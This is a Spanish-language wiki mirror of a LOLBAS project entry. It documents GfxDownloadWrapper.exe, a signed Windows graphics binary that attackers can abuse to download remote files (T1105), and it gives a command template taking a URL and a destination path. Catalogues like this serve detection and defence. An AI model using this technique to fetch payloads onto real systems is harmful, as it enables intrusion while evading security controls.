# LOLBAS: GfxDownloadWrapper.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Download`

Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path.

## Comandos

### Download file from internet

Download · priv: User · T1105

```cmd
C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "URL" "DESTINATION FILE"
```

GfxDownloadWrapper.exe downloads the content that returns URL and writes it to the file DESTINATION FILE PATH. The binary is signed by "Microsoft Windows Hardware", "Compatibility Publisher", "Microsoft Windows Third Party Component CA 2012", "Microsoft Time-Stamp PCA 2010", "Microsoft Time-Stamp Service".

